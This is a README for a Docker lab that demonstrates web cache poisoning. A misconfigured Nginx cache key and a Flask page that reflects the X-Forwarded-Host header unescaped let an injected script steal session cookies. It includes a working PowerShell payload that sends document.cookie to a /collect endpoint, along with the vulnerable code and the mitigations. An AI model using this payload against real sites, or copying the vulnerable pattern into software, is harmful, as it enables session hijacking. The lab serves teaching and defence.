# Web Cache Poisoning & Session Hijacking Lab

This repository contains a containerized lab environment designed to demonstrate a **Web Cache Poisoning** attack. By exploiting a misconfigured Nginx cache key, an attacker can inject malicious JavaScript into a public page, leading to the theft of session cookies from authenticated users.



## 🛡️ Educational Purpose
This project is for **educational and research purposes only**. It demonstrates a critical web security vulnerability to help developers and security engineers understand:
1.  The difference between **Keyed** and **Unkeyed** HTTP inputs.
2.  How reverse proxies like Nginx store and serve cached content.
3.  How to mitigate cache-based attacks through proper configuration.

---

## 🏗️ Architecture
The environment consists of two main services orchestrated via Docker:

* **Nginx (Reverse Proxy/Cache):** Listens on port `8080`. It handles caching logic and acts as the front-facing gateway.
* **Flask (Backend Application):** Listens on port `5000`. It manages user authentication, private profiles, and the vulnerable public profile.



---

## 🚀 Getting Started

### Prerequisites
* [Docker](https://docs.docker.com/get-docker/) and [Docker Compose](https://docs.docker.com/compose/install/)
* PowerShell (for the attack payload)

### Installation
1.  **Clone the repository:**
    ```bash
    git clone https://github.com/RobZ578/vulnerable-cache-app.git
    cd vulnerable-cache-app
    ```
2.  **Start the environment:**
    ```bash
    docker-compose up --build
    ```

---

## 🔓 The Vulnerability

### 1. The Cache Key (Nginx)
In the `nginx.conf` file, the cache key is dangerously narrow:
```nginx
proxy_cache_key "$request_uri";
Because the key only considers the URI, Nginx ignores the X-Forwarded-Host header when deciding whether to serve a cached response.

2. The Sink (Flask)
The Flask app reflects the X-Forwarded-Host header directly into the HTML:

Python

poison = request.headers.get('X-Forwarded-Host', 'Default-Zone')
return f"<h1>Public Profile</h1><p>Region: {poison}</p>"
⚔️ Proof of Concept (The Attack)
Step 1: Poison the Cache
Run this PowerShell one-liner to inject the malicious script into the Nginx cache. This script uses a hidden Image object to exfiltrate cookies to the /collect endpoint instantly.

PowerShell

$p = '<script>new Image().src="/collect?c="+document.cookie;</script>'; Invoke-WebRequest -Uri "http://localhost:8080/profile-public" -Headers @{"X-Forwarded-Host"=$p} -Verbose
Note: Run this twice. The second attempt should return X-Cache-Status: HIT.

Step 2: The Victim Login
Navigate to http://localhost:8080/login.

Log in as alice (Password: alice).

The app redirects you to the private /profile page, showing "Welcome alice".

Step 3: Trigger the Hijack
While logged in as Alice, click the link to the "Public Cached Page".

Because the cache is poisoned, the browser executes the script.

The session cookie is silently sent to the attacker's /collect page.

Step 4: Collect the Loot
Visit http://localhost:8080/collect to view the captured session cookies.

🛡️ Mitigation
1. Correct Cache Key Configuration
Ensure all headers that affect the page output are included in the cache key.

Nginx

proxy_cache_key "$request_uri$http_x_forwarded_host";
2. Output Encoding
Use a template engine like Jinja2 to automatically escape HTML characters, ensuring that even if a header is reflected, it is treated as text rather than executable code.

Python

# Safer implementation using render_template
return render_template('profile_public.html', region=poison)
HTML

<p>Region: {{ region }}</p>